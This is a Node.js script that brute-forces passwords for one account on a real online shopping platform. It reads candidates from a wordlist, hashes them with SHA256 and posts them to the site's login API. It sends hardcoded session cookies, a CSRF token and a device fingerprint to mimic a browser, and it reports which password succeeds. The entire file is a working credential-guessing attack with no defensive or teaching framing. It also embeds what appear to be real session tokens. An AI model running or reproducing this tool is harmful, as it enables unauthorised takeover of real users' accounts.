//Dependencies
const Request = require("request")
const SHA256 = require("sha256")
const Fs = require("fs")

//Variables
const Self_Args = process.argv.slice(2)

//Main
if(!Self_Args.length){
    console.log("node index.js <username> <dictionary> <country_code>")
    process.exit()
}

if(!Self_Args[0]){
    console.log("Invalid username.")
    process.exit()
}

if(!Self_Args[1]){
    console.log("Invalid dictionary.")
    process.exit()
}

if(!Self_Args[2]){
    console.log("Invalid country_code.")
    process.exit()
}

Self_Args[2] = Self_Args[2].toLowerCase()

if(!Fs.existsSync(Self_Args[1])){
    console.log("Invalid dictionary.")
    process.exit()
}

const dictionary_data = Fs.readFileSync(Self_Args[1], "utf8").split("\n")

var dictionary_index = 0

Check()
function Check(){
    if(dictionary_index == dictionary_data.length){
        console.log("Finished checking.")
        process.exit()
    }

    Request.post(`https://shopee.${Self_Args[2]}/api/v2/authentication/login`, {
        headers: {
            "Content-Type": "application/json",
            "x-api-source": "pc",
            "x-csrftoken": "LPuhM44moFh1hDeFmmITtLZTzOfoWgNs",
            "x-shopee-language": "en",
            "origin": `https://shopee.${Self_Args[2]}`,
            "referer": `https://shopee.${Self_Args[2]}/buyer/login`,
            "Cookie": '_gcl_au=1.1.2108365916.1636337414; csrftoken=LPuhM44moFh1hDeFmmITtLZTzOfoWgNs; SPC_IA=-1; SPC_EC=-; SPC_F=wpDnt2vIFMdGpprZsQhvtxpa84cgG3Rv; REC_T_ID=0ebf48a4-4049-11ec-94d5-36170fbe889f; SPC_SI=mall.eCQIc8WTMqwnpEdrP5xSplhAEkJKpOHE; SPC_U=-; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1; welcomePkgShown=true; _gid=GA1.2.87981107.1636337453; cto_bundle=JRDyVF9nRGhDc05Xa1BWOXJoa0xGNWhBd3VhWElFc1FGbk1KSG5NcGVOR2RRUGtpMktEMmp6WCUyQm5mT0pURVhjbGlxcm5LUzh4QTVFNENQTk8xcHpaWWhJcFhXOVJIbjRCTzUwNlBHRlRGb0hKbW5OS1pWM1Njbmx6NTREeGhaJTJCeEJKOGVNREY2RyUyRkYxNmVsRyUyQlYwUFNhcE9WQSUzRCUzRA; _QPWSDCXHZQA=938603ab-fd04-4c7c-e5c4-6f1c9c1f3f89; G_ENABLED_IDPS=google; SPC_CLIENTID=d3BEbnQydklGTWRHsxqsajblwfnjbmed; SPC_T_ID=4RT2BVi3wSZSVXOh1T6UGF/7fHi2loZIdDRH7rZfx8bL3wPmOX5EOjz/XsUkgsy5mpnhtVu4kY4WGL7p/f4PDfdGyKbz8CpzBolmoVzFJhU=; SPC_T_IV=u1zV/LA98Uc3WLNu2PUOWg==; _ga=GA1.2.794407531.1636337450; _ga_CB0044GVTM=GS1.1.1636337445.1.1.1636340285.56; shopee_webUnique_ccd=ROsrcjl1R34OTr2In6vWfg%3D%3D%7CoGdRnQYeE0pgCmPtLWZ9F%2FctLEWbE%2BWKlcN2pm5c%2F61OOdb%2BmcH2OtOhd3mxApe8OjTJvexjifcJGYOo%7C9kKMW9ZR06udATdG%7C03%7C3; SPC_R_T_ID="U4JTffYPXU6G5e6mRYAmlrz31O7q8mq6EMeCq1QYvbHWwg3+QtrCiKwKz9XopLZzUgFbm0cJnR49gFuDdc9jX0ThOs+zUPnIy4n0JXaq0OI="; SPC_T_IV="qSWbIZJtUYgLDiQmoGhwng=="; SPC_R_T_IV="qSWbIZJtUYgLDiQmoGhwng=="; SPC_T_ID="U4JTffYPXU6G5e6mRYAmlrz31O7q8mq6EMeCq1QYvbHWwg3+QtrCiKwKz9XopLZzUgFbm0cJnR49gFuDdc9jX0ThOs+zUPnIy4n0JXaq0OI="',
            "if-none-match": "55b03-6d751aab9e608a4228f1c3d2208dd1c1"
        },
        body: JSON.stringify({ "username": Self_Args[0], "password": SHA256(dictionary_data[dictionary_index]), "support_whats_app":true, "support_ivs":true, "device_sz_fingerprint":"vYs2tOrMRUyF5Di+mZ0IAw==|oGdRnQ4eU1pkChPtpztEepMirWCj588+OSDzrnDg8cl/DtDvI7bLQrDntY9oJRT8/iXD1ouWEucJq4Oq|9kKMW9ZR06udATdG|03|3"})
    }, function(err, res, body){
        if(body.indexOf("a99cd02d542c9f36cbbbad71bc3d75f1") != -1){
            console.log("The username does not exist in this country.")
            process.exit()
        }

        if(body.indexOf("0075c2569e70b86c971eb1a29b9a1265") == -1 && body.indexOf("4d9a0fcd50842f3370b49b3abf780c3b") == -1){
            console.log(`Valid password ${dictionary_data[dictionary_index]}`)
        }else{
            console.log(`Invalid password ${dictionary_data[dictionary_index]}`)
        }

        dictionary_index += 1
        Check()
        return
    })
}
